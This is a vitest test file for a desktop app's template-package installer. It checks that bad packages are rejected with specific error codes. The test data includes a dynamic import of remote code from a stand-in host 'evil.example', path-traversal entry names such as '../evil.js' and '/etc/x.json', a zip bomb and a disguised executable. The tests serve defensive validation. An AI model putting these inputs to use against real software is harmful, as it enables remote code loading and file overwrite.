// T-TPL-6：安装校验（docs/04-templates.md 4.8）。带 import 的脚本、路径穿越、超大包、冒用 allay. 前缀、基模板缺失，
// 以及其余每个错误码：各自被拒绝并返回对应错误码，暂存区和模板目录里不留下任何东西。
import { randomBytes } from 'node:crypto';
import { existsSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { MAX_PACKAGE_BYTES, type InstallErrorCode } from '../../apps/desktop/src/shared/templates';
import type { TemplateService } from '../../apps/desktop/src/main/templates/service';
import { buildZip } from './helpers/resource-fixtures';
import { BASE_CODE, baseManifest, basePackage, buildBuiltins, derivedPackage, makeService, writePackage, type Entries } from './helpers/template-fixtures';

let root: string;
let builtinDir: string;
let svc: TemplateService;

beforeAll(async () => {
  root = mkdtempSync(join(tmpdir(), 'allay-tpl6-'));
  builtinDir = join(root, 'builtin');
  await buildBuiltins(builtinDir);
  svc = await makeService(join(root, 'user'), builtinDir);
}, 60_000);

afterAll(() => rmSync(root, { recursive: true, force: true }));

let seq = 0;
async function stage(entries: Entries) {
  return svc.stage(writePackage(join(root, 'in', `${++seq}.allaytpl`), entries));
}

async function expectRejected(result: Awaited<ReturnType<TemplateService['stage']>>, code: InstallErrorCode) {
  expect('ok' in result && !result.ok ? result.error.code : JSON.stringify(result)).toBe(code);
  // 被拒绝的包不进暂存区，也不出现在模板列表里
  const staging = join(root, 'user', 'templates', '.staging');
  expect(existsSync(staging) ? readdirSync(staging) : []).toEqual([]);
  expect(svc.list().filter((e) => e.source === 'user')).toEqual([]);
}

const withCode = (code: string) => basePackage({}, { 'template.js': code });

describe('T-TPL-6 安装校验', () => {
  it('内置模板走同一条装载路径，列表里有 T1', () => {
    const t1 = svc.list().find((e) => e.id === 'allay.builtin.block-wipe');
    expect(t1).toMatchObject({ source: 'builtin', kind: 'script', baseMissing: false });
  });

  it('合法的包通过第 1–3 步，提交后出现在列表里（作为对照）', async () => {
    const r = await stage(basePackage({ id: 'user.test.ok' }));
    expect(r).toMatchObject({ ok: true, replaces: false });
    if (!('ok' in r) || !r.ok) return;
    expect(r.bundle.code).toBe(BASE_CODE);
    await svc.cancel(r.stagingId);
    expect(svc.list().some((e) => e.id === 'user.test.ok')).toBe(false);
  });

  it('带静态 import 或动态 import() 的脚本：code-has-import', async () => {
    await expectRejected(await stage(withCode(`import x from 'three';\n${BASE_CODE}`)), 'code-has-import');
    await expectRejected(await stage(withCode(`${BASE_CODE}\nconst m = import('https://evil.example/x.js');`)), 'code-has-import');
  });

  it('路径穿越、绝对路径、盘符、反斜杠：unsafe-path，整包拒绝', async () => {
    const pkg = basePackage();
    const zipWith = (name: string) => {
      const file = join(root, 'in', `${++seq}.allaytpl`);
      writeFileSync(file, buildZip([...Object.entries(pkg).map(([n, d]) => ({ name: n, data: d })), { name, data: 'x' }]));
      return svc.stage(file);
    };
    for (const name of ['../evil.js', 'assets/../../evil.png', '/etc/x.json', 'C:/x.json', 'assets\\..\\x.png']) {
      await expectRejected(await zipWith(name), 'unsafe-path');
    }
  });

  it('超过 50 MB 的包：package-too-large', async () => {
    const file = join(root, 'in', 'huge.allaytpl');
    writePackage(file, basePackage({}, { 'assets/pad.txt': randomBytes(MAX_PACKAGE_BYTES + 1024) }));
    await expectRejected(await svc.stage(file), 'package-too-large');
  });

  it('解压炸弹（谎报大小、真实解压超限）：unpacked-too-large', async () => {
    // 中央目录里声明 100 MB
    const lie = join(root, 'in', 'lie.allaytpl');
    writeFileSync(lie, buildZip([...Object.entries(basePackage()).map(([name, data]) => ({ name, data })), { name: 'assets/a.txt', data: 'x', method: 'deflate', declaredSize: 100 * 1024 * 1024 }]));
    await expectRejected(await svc.stage(lie), 'unpacked-too-large');
    // 几十 KB 的压缩数据解压出 60 MB
    const bomb = join(root, 'in', 'bomb.allaytpl');
    writePackage(bomb, basePackage({}, { 'assets/zeros.txt': new Uint8Array(60 * 1024 * 1024) }));
    await expectRejected(await svc.stage(bomb), 'unpacked-too-large');
  });

  it('冒用 allay. 前缀：reserved-id', async () => {
    await expectRejected(await stage(basePackage({ id: 'allay.builtin.fake' })), 'reserved-id');
    await expectRejected(await stage(basePackage({ id: 'allay.builtin.block-wipe' })), 'reserved-id');
  });

  it('基模板缺失或版本不匹配：base-missing；基模板本身是派生模板：base-not-script', async () => {
    await expectRejected(await stage(derivedPackage()), 'base-missing');
    await expectRejected(await stage(derivedPackage({ extends: { id: 'allay.builtin.block-wipe', version: '^2.0.0' } })), 'base-missing');
    await expectRejected(await stage(derivedPackage({ extends: { id: 'user.nobody.base', version: '*' } })), 'base-missing');
    // 先装一个派生自 T1 的模板，再让另一个派生模板以它为基
    const ok = await svc.saveDerived({ base: { id: 'allay.builtin.block-wipe', version: '1.0.0' }, name: 'Blue', defaults: { cols: 16 }, hidden: [] });
    expect(ok.ok).toBe(true);
    if (!ok.ok) return;
    const r = await stage(derivedPackage({ id: 'user.test.second', extends: { id: ok.entry.id, version: '^1.0.0' } }));
    expect('ok' in r && !r.ok && r.error.code).toBe('base-not-script');
    await svc.remove(ok.entry.id, ok.entry.version);
  });

  it('其余错误码：bad-extension、manifest-missing、manifest-invalid、format-too-new、app-too-old、code-missing、derived-has-code、code-too-large、code-syntax、not-a-zip', async () => {
    await expectRejected(await stage(basePackage({}, { 'assets/run.exe': 'MZ' })), 'bad-extension');
    await expectRejected(await stage(basePackage({}, { 'extra.html': '<b>' })), 'bad-extension');
    await expectRejected(await stage({ 'template.js': BASE_CODE }), 'manifest-missing');
    await expectRejected(await stage({ ...basePackage(), 'manifest.json': '{ not json' }), 'manifest-invalid');
    await expectRejected(await stage(basePackage({ category: 'intro' })), 'manifest-invalid');
    await expectRejected(await stage(basePackage({ formatVersion: 2 })), 'format-too-new');
    await expectRejected(await stage(basePackage({ minAppVersion: '9.0.0' })), 'app-too-old');
    const { 'template.js': _code, ...noCode } = basePackage();
    await expectRejected(await stage(noCode), 'code-missing');
    await expectRejected(await stage(derivedPackage({ extends: { id: 'allay.builtin.block-wipe', version: '^1.0.0' }, overrides: {} }, { 'template.js': BASE_CODE })), 'derived-has-code');
    await expectRejected(await stage(withCode(`${BASE_CODE}\n//${'x'.repeat(1024 * 1024)}`)), 'code-too-large');
    await expectRejected(await stage(withCode('export default {{{')), 'code-syntax');
    const notZip = join(root, 'in', 'not.allaytpl');
    writeFileSync(notZip, 'definitely not a zip');
    await expectRejected(await svc.stage(notZip), 'not-a-zip');
    await expectRejected(await svc.stage(join(root, 'in', 'missing.allaytpl')), 'not-a-zip');
  });

  it('暂存超时后提交：staging-expired；取消后暂存区清空', async () => {
    let now = Date.now();
    const timed = await makeService(join(root, 'user-timed'), builtinDir);
    (timed as unknown as { now: () => number }).now = () => now;
    const r = await timed.stage(writePackage(join(root, 'in', 'timed.allaytpl'), basePackage({ id: 'user.test.timed' })));
    if (!('ok' in r) || !r.ok) throw new Error('stage failed');
    now += 11 * 60 * 1000;
    expect(await timed.commit(r.stagingId, { warnings: [] })).toMatchObject({ ok: false, error: { code: 'staging-expired' } });
    expect(readdirSync(join(root, 'user-timed', 'templates', '.staging'))).toEqual([]);
    expect(timed.list().some((e) => e.id === 'user.test.timed')).toBe(false);
  });

  it('提交后解压到 userData/templates/<id>/<version>/，重启后照样装载；删除后目录不在', async () => {
    const r = await stage(basePackage({ id: 'user.test.kept' }));
    if (!('ok' in r) || !r.ok) throw new Error('stage failed');
    const c = await svc.commit(r.stagingId, { warnings: ['nondeterministic'] });
    expect(c).toMatchObject({ ok: true, entry: { id: 'user.test.kept', version: '1.2.0', trialWarnings: ['nondeterministic'] } });
    const dir = join(root, 'user', 'templates', 'user.test.kept', '1.2.0');
    expect(readdirSync(dir).sort()).toEqual(['assets', 'manifest.json', 'template.js']);
    const again = await makeService(join(root, 'user'), builtinDir);
    expect(again.list().find((e) => e.id === 'user.test.kept')).toMatchObject({ trialWarnings: ['nondeterministic'] });
    expect((await again.read('user.test.kept', '1.2.0'))?.code).toBe(BASE_CODE);
    // 重新导出的包与安装的内容一致，能再装一次（替换同版本）
    const exported = await again.exportPackage('user.test.kept', '1.2.0');
    expect(exported).not.toBeNull();
    const file = join(root, 'in', 'exported.allaytpl');
    writeFileSync(file, exported!);
    expect(await again.stage(file)).toMatchObject({ ok: true, replaces: true });
    expect(await again.remove('user.test.kept', '1.2.0')).toBe(true);
    expect(existsSync(join(root, 'user', 'templates', 'user.test.kept'))).toBe(false);
    // 内置模板不能删
    expect(await again.remove('allay.builtin.block-wipe', '1.0.0')).toBe(false);
    void baseManifest;
  });
});
